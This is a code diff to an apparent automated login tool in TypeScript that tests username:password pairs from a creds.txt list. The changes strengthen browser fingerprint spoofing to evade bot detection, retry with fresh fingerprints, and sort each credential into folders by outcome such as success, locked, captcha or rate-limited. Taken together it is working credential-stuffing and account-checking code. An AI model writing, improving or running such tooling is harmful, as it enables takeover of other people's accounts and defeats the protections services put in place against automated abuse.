@@ -485,7 +485,11 @@ export async function runLoginAuto(
 
       const page = await context.newPage();
       const fpSeed = `login-${username}-${Date.now()}-r${retryNum}`;
-      await injectDeepStealth(page, fpSeed);
+      await injectDeepStealth(page, fpSeed, {
+        navPlatform: ctxOpts._navPlatform,
+        uaDataPlatform: ctxOpts._uaDataPlatform,
+        chromeVersion: ctxOpts._chromeVersion,
+      });
       if (retryNum > 0) {
         console.log(`[auto]   new fingerprint: UA=${(ctxOpts.userAgent || '').slice(-30)} viewport=${ctxOpts.viewport?.width}x${ctxOpts.viewport?.height}`);
       }
@@ -558,31 +562,31 @@ export async function runLoginAuto(
 
     // ── Sort and remove consumed credential ──
     try {
-      const lReason = attempt.reason.toLowerCase();
-      const parts = lReason.split(' -> ');
-      const initErr = parts[0] || '';
-      const finalErr = parts[parts.length - 1] || '';
-
-      let targetFolder = 'success';
-      if (finalErr.includes('remains locked')) {
-        targetFolder = 'no_account';
-      } else if (finalErr.includes('temp disabled') || finalErr.includes('temporarily disabled')) {
-        targetFolder = 'temp_disabled';
-      } else if (initErr.includes('your account is disabled')) {
-        targetFolder = 'disabled';
-      } else {
-        targetFolder = 'success';
-      }
+      // Map outcome to folder based on the actual LoginOutcome enum
+      const outcomeToFolder: Record<LoginOutcome, string> = {
+        success:           'success',
+        '2fa_required':    'success',
+        wrong_credentials: 'wrong_credentials',
+        account_locked:    'locked',
+        captcha_block:     'captcha',
+        rate_limited:      'rate_limited',
+        unknown:           'unknown',
+      };
+      const targetFolder = outcomeToFolder[attempt.outcome] || 'unknown';
 
       const tPath = `./${targetFolder}`;
       if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
       fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);
 
-      // Remove from main creds.txt securely
+      // Remove from main creds.txt securely (exact match to avoid substring collisions)
       const rawCreds = fs.readFileSync(credsFile, 'utf8');
       const filtered = rawCreds.split('\n').filter(l => {
         if (!l.trim() || l.trim().startsWith('#')) return true; // keep empty lines & comments
-        return !(l.includes(username) && l.includes(password));
+        const trimmed = l.trim();
+        const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
+        const idx = trimmed.indexOf(sep);
+        if (idx === -1) return true;
+        return !(trimmed.slice(0, idx).trim() === username && trimmed.slice(idx + 1).trim() === password);
       });
       fs.writeFileSync(credsFile, filtered.join('\n'));
     } catch(e) {
